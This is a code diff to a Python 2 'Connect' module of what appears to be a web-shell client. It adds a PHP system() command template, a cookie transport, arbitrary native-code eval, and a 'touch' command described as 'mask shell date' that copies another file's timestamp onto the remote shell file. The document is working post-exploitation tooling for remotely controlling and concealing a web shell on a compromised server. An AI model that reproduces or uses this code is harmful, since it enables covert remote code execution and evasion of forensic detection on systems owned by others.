@@ -7,9 +7,10 @@ import shlex
 from cli import color
 from cli.cli import InteractiveMixin
 from modules.module import Module
-from lib.process import call
-from lib.io import write_file, read_file, escape, load_script, load_script_names
-from lib.shell.session import Session, cmds as hello
+from lib.io import write_file, read_file, escape
+from lib.io import load_script, load_script_names
+from lib.io import load_eval, load_eval_names
+from lib.shell.session import Session
 
 from tempfile import NamedTemporaryFile
 from collections import OrderedDict
@@ -21,8 +22,10 @@ class Connect( InteractiveMixin, Module ):
 	options = OrderedDict()
 
 	options['dir'] = '~'
-	options['editor'] = 'vim'
 	options['user-agent'] = 'Mozilla/5.0'
+	options['method'] = 'system("{}");'
+	options['transport'] = 'cookie'
+	options['editor'] = 'vim'
 	
 	_prompt_ = '{blue}.::{cyan}{domain}{purple}@{cyan}{ip}' \
 				'{blue}::{cyan}{path}' \
@@ -34,16 +37,25 @@ class Connect( InteractiveMixin, Module ):
 						path=self.env.get('dir','~') )
 		self.transport = Session( shell.url, shell.key, action=shell.action )
 		self.transport.user_agent = self.env.get('user-agent','Mozilla/5.0')
+		self.endpoint = shell.file
+		self.shell_doc_root = '~'
 
 	def hello( self ):
-		return self.execute(hello)
+		data = self.script("info")
+		shell_ii = data.find('[Shell]')
+		path_ii = data.find('\n',shell_ii)+1
+		path_nl_ii = data.find('\n',path_ii)
+		path = os.path.dirname(data[path_ii:path_nl_ii])
+		self.env['dir'] = path
+		self.shell_doc_root = path
+		return data
 
 	def execute( self, cmds ):
-		return self.transport( filter( None, cmds ))
+		return self.transport(filter(None,cmds),method=self.env.get('method'))
 
-	def cwd( self ):
-		if self.env.get('dir','~')!='~':
-			return 'cd {}'.format( self.env['dir'] )
+	def cwd( self ): #CHECK
+		if self.env.get('dir','~')!=self.shell_doc_root:
+			return 'cd {}'.format( self.env.get('dir', self.get_path()) )
 
 	def execute_one( self, cmd ):
 		return self.execute([ self.cwd(), cmd ])
@@ -61,12 +73,28 @@ class Connect( InteractiveMixin, Module ):
 			self.help_cd()
 			return
 		dir = args[0] if len(args)==1 else '~'
+
 		if dir=='~':
-			path = '~'
+			path = self.shell_doc_root
 		else:
-			path = os.path.abspath( os.path.join( self.get_path(), dir ))
+			cdir = self.env.get('dir', self.get_path())
+			path = os.path.abspath( os.path.join( cdir, dir ))
+			dir=path
+
 		self.env['dir'] = path
-		self.set_prompt(path=path)
+		self.set_prompt(path=dir)
+
+	def set_dir( self, value ):
+		if value=='~':
+			self.set_prompt(path=value)
+			return self.shell_doc_root
+		path = os.path.abspath(os.path.join(self.env.get('dir',self.get_path()),
+											value))
+		prompt = path
+		if path==self.shell_doc_root:
+			prompt='~'
+		self.set_prompt(path=prompt)
+		return path
 
 	def help_download( self ):
 		print ' Usage: download [remote] [local]'
@@ -117,6 +145,16 @@ class Connect( InteractiveMixin, Module ):
 	def help_script( self ):
 		print ' Usage: script [name] [outfile]'
 
+	def script( self, script ):
+		try:
+			script = load_script(script)
+		except IOError:
+			msg = 'Invalid script name {}'.format( script )
+			print self.pprint(marker='!').format( msg )
+			return
+		cmds = [ self.cwd(), ] + self.script_to_cmds(script)
+		return self.execute(cmds)
+
 	def do_script( self, line ):
 		'''execute script'''
 		args = shlex.split( line )
@@ -125,14 +163,7 @@ class Connect( InteractiveMixin, Module ):
 			return
 		name = args[0]
 		outfile = args[1] if len(args)==2 else None
-		try:
-			script = load_script(name)
-		except IOError:
-			msg = 'Invalid script name {}'.format( name )
-			print self.pprint(marker='!').format( msg )
-			return
-		cmds = [ self.cwd(), ] + self.script_to_cmds(script)
-		output = self.execute(cmds)
+		output = self.script(name)
 		if outfile:
 			write_file(outfile,output)
 		print output
@@ -143,3 +174,68 @@ class Connect( InteractiveMixin, Module ):
 
 	def complete_script( self, text, line, b_index, e_index ):
 		return self.default_complete( text, line, load_script_names )
+
+	def help_touch( self ):
+		print ' Usage: touch [file]'
+
+	def do_touch( self, line ):
+		'''mask shell date'''
+		args = shlex.split( line )
+		if len(args) not in [0,1]:
+			self.help_touch()
+			return
+		candidate = "ls -ltr " \
+					"| tail -n +2 | head -n 1 " \
+					"| sed -r -e 's/\s+/ /g' " \
+					"| cut -d' ' -f9"
+		file = args[0] if len(args)==1 else '`{}`'.format(candidate)
+		lt = 'ls -lt --full-time "{}"'.format( self.endpoint )
+		touch = 'touch "{}" -r "{}"'.format( self.endpoint, file )
+		cmds = [ lt, touch, lt ]
+		print self.execute(cmds)
+
+	def help_eval( self ):
+		print ' Usage: eval [file|{code}]'
+
+	def complete_eval( self, text, line, b_index, e_index ):
+		return self.default_complete( text, line, load_eval_names )
+
+	def eval( self, script ):
+		return self.transport(method=script.replace('{','{{').replace('}','}}'))
+
+	def do_eval( self, line ):
+		'''run native code'''
+		args = shlex.split( line )
+		if len(args)==0:
+			self.help_eval()
+			return
+		if (len(args)>1 and not
+						(args[0].startswith('{') and args[-1].endswith('}'))):
+			msg = 'Code must be enclosed in { .. }'
+			print self.pprint(marker='!').format( msg )
+			return
+		if args[0].startswith('{') and args[-1].endswith('}'):
+			script = line.strip()[1:-1]
+		else:
+			try:
+				script = load_eval(args[0])
+			except IOError:
+				msg = 'File {} not found'.format(args[0])
+				print self.pprint(marker='!').format( msg )
+				return
+		print self.eval( script )
+
+	def option_complete_transport( self, optc=0 ):
+		if optc==0: return self.transport.fields
+
+	def set_transport( self, value ):
+		try:
+			self.transport.field = value
+			return value
+		except TypeError:
+			msg = 'Invalid value {} for transport option'.format( value )
+			print self.pprint(marker='!').format( msg )
+			options =  self.option_complete_transport()
+			suggestion = 'Try the values {}'.format(', '.join(options))
+			print self.pprint().format( suggestion )
+			return self.env['transport']
